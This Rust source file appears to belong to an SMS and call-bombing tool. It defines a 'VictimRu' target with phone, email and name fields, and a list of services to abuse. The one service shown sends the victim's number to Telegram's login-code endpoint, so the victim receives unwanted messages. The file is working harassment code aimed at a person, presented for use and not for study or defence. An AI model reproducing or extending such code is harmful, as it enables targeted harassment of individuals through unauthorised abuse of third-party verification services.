use crate::phone::{FormatterTypes::*, Phone, PhoneRu};
use reqwest::{header::HeaderMap, Method};
use serde_json::json;

pub struct Service {
    pub name: String,
    pub service_type: ServiceType,
    pub method: Method,
    pub url: String,
    pub headers: HeaderMap,
    pub body_type: BodyType,
    pub body: serde_json::Value,
}

pub enum ServiceType {
    Sms,
    Call,
    ServiceMessage,
}

pub enum BodyType {
    JSON,
    Form,
}

pub trait Services {
    fn services(&self) -> Vec<Service>;
}

pub struct VictimRu {
    pub phone: PhoneRu,
    pub email: String,
    pub name: String,
    pub surname: String,
}

impl Services for VictimRu {
    fn services(&self) -> Vec<Service> {
        vec![{
            // Telegram
            let mut service = Service {
                name: "Telegram".to_string(),
                service_type: ServiceType::ServiceMessage,
                method: Method::POST,
                url: "https://my.telegram.org/auth/send_password".to_string(),
                headers: HeaderMap::new(),
                body_type: BodyType::Form,
                body: Default::default(),
            };

            let mut phone = self.phone.clone();
            phone.format(WithPlus);
            service.body = json!({
                "phone": phone.get()
            });

            service
        }]
    }
}
